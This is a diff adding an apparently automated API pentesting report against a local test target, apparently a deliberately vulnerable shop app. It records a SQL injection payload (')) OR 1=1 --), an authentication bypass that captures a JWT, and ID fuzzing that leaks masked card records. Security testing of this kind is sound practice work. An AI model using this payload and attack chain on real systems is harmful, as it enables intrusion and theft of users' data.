@@ -1,0 +1,35 @@
+************************************************************
+        AUTOMATED API PENTESTING REPORT        
+        Generated on: 2026-06-30 21:20:31
+************************************************************
+[+] Target Scope: http://localhost:3000
+
+==================================================
+[+] Module 1: Launching SQL Injection (SQLi) Scanner
+==================================================
+[🚨] VULNERABILITY CONFIRMED: SQLi successful with payload: ')) OR 1=1 --
+[📋] PoC Data Sample: {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple...
+
+==================================================
+[+] Auth Module: Attempting SQLi Auth Bypass to grab JWT Token...
+==================================================
+[🚨] EXPLOIT SUCCESSFUL: Logged in via SQL Injection Authentication Bypass!
+[+] JWT Token grabbed successfully: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUz...
+
+==================================================
+[+] Module 3: Launching Authenticated BOLA Scanner
+==================================================
+[~] Fuzzing IDs with the stolen Admin Token...
+[-] ID 1: Secure or returned Status 400
+[-] ID 2: Secure or returned Status 400
+[🚨] BOLA BYPASS SUCCESSFUL AT ID 3!
+[📋] Leaked Card Info: {"status":"success","data":{"UserId":1,"id":3,"fullName":"Administrator","cardNum":"************4368","expMonth":2,"expYear":2081}}
+
+[🚨] BOLA BYPASS SUCCESSFUL AT ID 4!
+[📋] Leaked Card Info: {"status":"success","data":{"UserId":1,"id":4,"fullName":"Administrator","cardNum":"************8108","expMonth":4,"expYear":2086}}
+
+[-] ID 5: Secure or returned Status 400
+
+==================================================
+[+] All scanning modules completed. Report saved to: api_report.txt
+==================================================
